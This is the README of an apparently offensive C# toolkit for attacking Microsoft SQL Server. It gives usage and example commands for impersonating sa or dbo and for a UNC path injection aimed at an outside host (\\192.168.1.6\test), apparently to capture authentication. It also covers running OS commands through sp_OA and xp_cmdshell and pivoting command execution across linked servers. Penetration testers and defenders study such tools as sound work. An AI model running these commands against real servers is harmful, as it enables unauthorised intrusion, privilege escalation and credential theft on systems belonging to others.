# mssqlcodexecutor
CSharp mssql code executor

## MSSQLAuthenticator
Usage:
```
MSSQLAuthenticator.exe <sql server> <database name>
```
Example:
```
MSSQLAuthenticator.exe sql.local master
```
## SQLImpersonation
### SQLImpersonation-Check
Usage:
```
SQLImpersonation.exe <sql server> <database name> check
```
Example:
```
SQLImpersonation.exe sql.local master check
```
### SQLImpersonation-Impersonate
Usage:
```
SQLImpersonation.exe <sql server> <database name> impersonate <sa/dbo>
```
Example:
```
SQLImpersonation.exe sql.local master impersonate sa
```
## UNCPathInjection
Usage:
```
UNCPathInjection.exe <sql server> <database name> <unc path>
```
Example:
```
UNCPathInjection.exe sql.local master \\192.168.1.6\test
```
## spOACodeExecution
Usage:
```
spOACodeExecution.exe <sql server> <database name> <command>
```
Example:
```
spOACodeExecution.exe sql.local master whomi
```
## xpcmdshellCodeExecution
Usage:
```
xpcmdshellCodeExecution.exe <sql server> <database name> <command>
```
Example:
```
xpcmdshellCodeExecution.exe sql.local master whoami
```
## LinkedSQLServer
### Check
Usage:
```
LinkedSQLServer.exe <sql server 1> <database name> check
```
Example:
```
LinkedSQLServer.exe sql01.local master check
```
### Verify
Usage:
```
LinkedSQLServer.exe <sql server 1> <database name> verify <sql server 2>
```
Example:
```
LinkedSQLServer.exe sql01.local master verify sql02
```

### Execute
Usage:
```
LinkedSQLServer.exe <sql server> <database name> execute <sql server 2> <command>
```
Example:
```
LinkedSQLServer.exe sql01.local master execute sql02 whoami
```
